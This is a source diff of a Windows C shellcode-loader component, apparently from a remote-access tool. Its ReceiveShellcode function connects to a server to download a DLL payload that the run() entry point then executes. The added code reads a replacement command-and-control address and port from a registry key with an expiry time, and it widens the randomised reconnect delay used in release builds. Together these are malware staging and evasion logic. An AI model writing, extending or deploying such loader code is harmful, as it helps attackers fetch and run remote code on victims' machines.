@@ -6,16 +6,16 @@
 #include <assert.h>
 #include <stdbool.h>
 #include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
 
 #ifdef _DEBUG
-#include <stdio.h>
 #define Mprintf printf
 #define IsRelease 0
 #else
 #define Mprintf(format, ...) 
 #define IsRelease 1
 #endif
-#include <stdlib.h>
 
 #pragma comment(lib, "ws2_32.lib")
 
@@ -89,6 +89,28 @@ int GetIPAddress(const char* hostName, char* outIpBuffer, int bufferSize)
 	return 0;
 }
 
+char* ReadRegistryString(const char* subKey, const char* valueName) {
+	HKEY hKey = NULL;
+	LONG ret = RegOpenKeyExA(HKEY_CURRENT_USER, subKey, 0, KEY_READ, &hKey);
+	if (ret != ERROR_SUCCESS) 
+		return NULL;
+
+	DWORD dataType = 0;
+	DWORD dataSize = 1024;
+	char *data = (char*)malloc(dataSize+1);
+	if (data) {
+		ret = RegQueryValueExA(hKey, valueName, NULL, &dataType, (LPBYTE)data, &dataSize);
+		data[min(dataSize, 1024)] = '\0';
+		if (ret != ERROR_SUCCESS || (dataType != REG_SZ && dataType != REG_EXPAND_SZ)) {
+			free(data);
+			data = NULL;
+		}
+	}
+	RegCloseKey(hKey);
+
+	return data;
+}
+
 const char* ReceiveShellcode(const char* sIP, int serverPort, int* sizeOut) {
 	if (!sIP || !sizeOut) return NULL;
 
@@ -96,11 +118,26 @@ const char* ReceiveShellcode(const char* sIP, int serverPort, int* sizeOut) {
 	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
 		return NULL;
 
+	char addr[100] = { 0 };
+	strcpy(addr, sIP);
+	const char* path = "Software\\ServerD11\\settings";
+	char* saved_ip = ReadRegistryString(path, "master");
+	char* saved_port = ReadRegistryString(path, "port");
+	char* valid_to = ReadRegistryString(path, "valid_to");
+	int now = time(NULL), valid = valid_to ? atoi(valid_to) : 0;
+	if (now <= valid && saved_ip && *saved_ip && saved_port && *saved_port) {
+		strcpy(addr, saved_ip);
+		serverPort = atoi(saved_port);
+	}
+	free(saved_ip); saved_ip = NULL;
+	free(saved_port); saved_port = NULL;
+	free(valid_to); valid_to = NULL;
+
 	char serverIP[INET_ADDRSTRLEN] = { 0 };
-	if (GetIPAddress(sIP, serverIP, sizeof(serverIP)) == 0) {
+	if (GetIPAddress(addr, serverIP, sizeof(serverIP)) == 0) {
 		Mprintf("Resolved IP: %s\n", serverIP);
 	} else {
-		Mprintf("Failed to resolve '%s'.\n", sIP);
+		Mprintf("Failed to resolve '%s'.\n", addr);
 		WSACleanup();
 		return NULL;
 	}
@@ -112,7 +149,7 @@ const char* ReceiveShellcode(const char* sIP, int serverPort, int* sizeOut) {
 	int attemptCount = 0, requestCount = 0;
 	do {
 		if (!isFirstConnect)
-			Sleep(IsRelease ? rand()%60 * 1000 : 5000);
+			Sleep(IsRelease ? rand()%120 * 1000 : 5000);
 		isFirstConnect = FALSE;
 		if (++attemptCount == 20)
 			PostMessage((HWND)g_Server.parentHwnd, 4046, (WPARAM)933711587, (LPARAM)1643138518);
@@ -216,6 +253,9 @@ inline int MemoryFind(const char* szBuffer, const char* Key, int iBufferSize, in
 #endif
 
 extern DLL_API DWORD WINAPI run(LPVOID param) {
+	char eventName[64] = { 0 };
+	sprintf(eventName, "EVENT_%d", GetCurrentProcessId());
+	HANDLE hEvent = CreateEventA(NULL, TRUE, FALSE, eventName);
 	PluginParam* info = (PluginParam*)param;
 	int size = 0;
 	const char* dllData = ReceiveShellcode(info->IP, info->Port, &size);
